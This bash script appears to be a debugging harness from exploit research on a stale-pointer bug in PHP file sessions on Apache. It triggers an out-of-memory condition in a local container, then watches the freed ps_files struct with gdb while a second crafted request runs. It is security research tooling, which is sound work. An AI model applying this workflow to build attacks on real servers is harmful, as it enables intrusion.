#!/bin/bash
# A1 (send_cookie OOM) -> watchpoint on the stale ps_files struct during B.
# Prints who writes md/md+8/id and the B request's heap state at each hit.
set -u

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
R=$(cd "$HERE/.." && pwd)
NAME=${NAME:-p2s-pure-18110}
PORT=${PORT:-18110}
DOCKER=${DOCKER:-sudo docker}
BPARTS=${BPARTS:-0}
BSID=${BSID:-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}
BPROG=${BPROG:-k0}
BVL=${BVL:-0}
BN=${BN:-0}
BNAME=${BNAME:-10}

# 1) fresh worker + A1
F128=14 BIG=78 BURN=20 PROG_LEN=4000 "$HERE/run_a1_probe.sh" >/tmp/a1w.log 2>&1
A1URL=$(grep -m1 '^URLPS' /tmp/a1w.log)
echo "A1: $A1URL"
MD=$(printf '%s\n' "$A1URL" | sed -n 's/.* md=\(0x[0-9a-f]*\).*/\1/p')
ID=$(printf '%s\n' "$A1URL" | sed -n 's/.* ps=0x[0-9a-f]* id=\(0x[0-9a-f]*\).*/\1/p')
BASEDIR=$(printf '%s\n' "$A1URL" | sed -n 's/.* basedir=\(0x[0-9a-f]*\).*/\1/p')
echo "md=$MD id=$ID basedir=$BASEDIR"
[ -n "$MD" ] && [ -n "$ID" ] || { echo "failed to parse A1 state"; exit 1; }

# 2) gdb with watchpoints
cat > /tmp/watch_b.gdb <<EOF
set pagination off
set confirm off
watch *(unsigned long*)$MD
watch *(unsigned long*)($MD+8)
watch *(unsigned long*)$ID
commands 1
silent
printf "HIT md0 val=%#lx\\n", *(unsigned long*)$MD
bt 8
continue
end
commands 2
silent
printf "HIT md8 val=%#lx\\n", *(unsigned long*)($MD+8)
bt 8
continue
end
commands 3
silent
printf "HIT id val=%#lx\\n", *(unsigned long*)$ID
bt 8
continue
end
continue
EOF

PID=$($DOCKER exec "$NAME" pgrep -P 1 apache2 | tail -1)
$DOCKER cp /tmp/watch_b.gdb "$NAME":/tmp/watch_b.gdb >/dev/null
$DOCKER exec -d "$NAME" sh -c "gdb -q -p $PID -batch -x /tmp/watch_b.gdb > /tmp/watch_b.log 2>&1"
sleep 1

# 3) B
cd "$R" || exit 1
python3 pure/cheap_oom_a.py --port "$PORT" --parts "$BPARTS" --sid "$BSID" \
  --progress "$BPROG" ${BVL:+--nest-value-len "$BVL"} 2>/dev/null || true
sleep 1.5
$DOCKER exec "$NAME" pkill -f "gdb -q -p" >/dev/null 2>&1 || true
sleep 0.5
echo "--- watch log (first 80):"
$DOCKER exec "$NAME" cat /tmp/watch_b.log 2>/dev/null | grep -E "^HIT|^#[0-9]|^Old value|^New value" | head -80
echo "--- worker:"; $DOCKER exec "$NAME" pgrep -P 1 apache2 | tail -1
